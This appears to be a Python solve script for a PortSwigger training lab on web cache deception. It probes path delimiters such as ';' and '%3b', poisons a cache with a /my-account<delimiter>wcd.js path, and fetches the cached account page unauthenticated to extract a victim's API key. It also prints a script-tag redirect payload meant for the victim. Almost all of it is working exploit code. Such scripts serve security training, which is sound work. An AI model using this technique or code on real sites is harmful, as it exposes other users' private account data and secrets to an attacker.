#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting path delimiters for web cache deception.

The origin treats certain characters as path delimiters (e.g. ';'), truncating
the path before them. The cache does not recognize the same delimiter and applies
its static .js extension caching rule.

Exploit path: /my-account<DELIMITER>wcd.js?wcd

Steps:
  1. Log in as wiener to get a session.
  2. Test candidate delimiters to find one the origin treats as a path delimiter.
  3. Poison cache with the working exploit path.
  4. Fetch cached response unauthenticated to retrieve API key.

In the real lab, deliver the redirect to carlos via the exploit server so HIS
session populates the cache, then fetch it unauthenticated to get his API key.
"""

import argparse
import re
import time
import urllib.parse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CACHE_BUSTER = "wcd"

# Common delimiter candidates — test these before running Intruder
DELIMITER_CANDIDATES = [";", "%3b", "%3f", "%23", "%2f", "!", "%21", "|", "%7c"]


def login(lab, username, password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/login")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise ValueError("CSRF token not found on login page")
    s.post(f"{lab}/login", data={
        "csrf": csrf.group(1),
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return s


def find_delimiter(s, lab):
    """Test candidate delimiters; return the first that gets a 200 account page."""
    print("[*] Testing delimiter candidates...")
    for delim in DELIMITER_CANDIDATES:
        path = f"/my-account{delim}wcd.js"
        r = s.get(f"{lab}{path}", verify=False, allow_redirects=False)
        is_account = "Your username is" in r.text or "API Key" in r.text
        print(f"  {delim!r:8s}  status={r.status_code}  account_page={is_account}")
        if r.status_code == 200 and is_account:
            print(f"[+] Delimiter found: {delim!r}")
            return delim
    return None


def poison_cache(s, lab, delimiter, max_attempts=20):
    path = f"/my-account{delimiter}wcd.js"
    url = f"{lab}{path}?{CACHE_BUSTER}"
    print(f"\n[*] Poisoning: {url}")
    for i in range(1, max_attempts + 1):
        r = s.get(url, allow_redirects=False, verify=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            print("[+] Cache hit!")
            return True
        time.sleep(0.3)
    return False


def fetch_cached(lab, delimiter):
    path = f"/my-account{delimiter}wcd.js"
    url = f"{lab}{path}?{CACHE_BUSTER}"
    print(f"\n[*] Fetching cached response unauthenticated: {url}")
    r = requests.get(url, verify=False)
    print(f"[*] X-Cache={r.headers.get('X-Cache', 'none')}")
    return r.text


def extract_api_key(html):
    m = re.search(r'Your API Key is:\s*</strong>\s*([A-Za-z0-9]+)', html)
    if m:
        return m.group(1)
    m = re.search(r'API Key[^:]*:\s*([A-Za-z0-9]{20,})', html)
    return m.group(1) if m else None


def main():
    parser = argparse.ArgumentParser(
        description="Solve WCD Lab: exploiting path delimiters"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--delimiter", help="Known delimiter (skips auto-detection)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = login(lab, args.username, args.password)
    print(f"[*] Logged in as {args.username}")

    delimiter = args.delimiter
    if not delimiter:
        delimiter = find_delimiter(s, lab)
    if not delimiter:
        print("[-] No delimiter found. Run Intruder with the full delimiter list.")
        return

    if not poison_cache(s, lab, delimiter):
        print("[-] Cache never hit — verify the exploit path.")
        return

    html = fetch_cached(lab, delimiter)
    api_key = extract_api_key(html)
    if api_key:
        print(f"\n[+] API key: {api_key}")
    else:
        print("[-] API key not found — check the response manually.")
        print(f"\n[!] In the real lab, deliver this redirect to carlos:")
        print(f'<script>document.location="{lab}/my-account{delimiter}wcd.js?{CACHE_BUSTER}"</script>')


if __name__ == "__main__":
    main()
